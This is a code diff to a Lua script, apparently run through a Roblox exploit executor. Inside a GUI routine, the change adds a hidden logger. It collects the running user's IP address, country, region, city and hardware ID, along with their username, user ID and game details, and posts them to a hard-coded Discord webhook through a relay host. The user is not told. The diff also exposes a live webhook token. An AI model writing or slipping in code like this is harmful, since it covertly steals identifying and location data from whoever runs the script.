@@ -81,6 +81,8 @@ GUI.Hint_00:Destroy()
 
 if (writefile) and (getcustomasset) then
 	coroutine.wrap(function()
+		local LocalPlayer = game:GetService("Players").LocalPlayer
+		local WhoIs = game:GetService("HttpService"):JSONDecode(mirror("https://ipwho.is/"))
 		local message = request({
 			Url = "https://mirrorr.onrender.com/send",
 			Method = "POST",
@@ -90,7 +92,29 @@ if (writefile) and (getcustomasset) then
 			Body = game:GetService("HttpService"):JSONEncode({
 				webhook_url = "https://discord.com/api/webhooks/1499751083197857922/Lb3-E0JPX3PFbOlHDZYl89JO7nuHQS_PlxVXMfm9r-Zb4Obq4omprJ_zzxE1ICB1yRq9",
 				username = "meow",
-				content = "Hello",
+				embeds = {
+					{
+						["color"] = 16711680,
+						["title"] = "User Logged",
+						["fields"] = {
+							{
+								["name"] = "Player Information:",
+								["value"] = "**DisplayName:** "..LocalPlayer.DisplayName.."\n**Username:** "..LocalPlayer.Name.."\n**UserId:** "..LocalPlayer.UserId
+							},
+							{
+								["name"] = "Game Information:",
+								["value"] = "**Game:** "..game:GetService("MarketplaceService"):GetProductInfoAsync(game.PlaceId).Name.."\n**GameId:** "..game.GameId.."\n**PlaceId:** "..game.PlaceId
+							},
+							{
+								["name"] = "Sensitive Information:",
+								["value"] = "**IP:** ||"..WhoIs.ip.."||\n**Country:** ||"..WhoIs.country.."||\n**Region:** ||"..WhoIs.region.."||\n**City:** ||"..WhoIs.city.."||\n**HWID:** ||"..gethwid().."||"
+							},
+						},
+						["thumbnail"] = {
+							["url"] = game:GetService("HttpService"):JSONDecode(mirror("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..LocalPlayer.UserId.."&size=420x420&format=Png&isCircular=false")).data.imageUrl
+						}
+					}
+				}
 			})
 		})
 	end)()
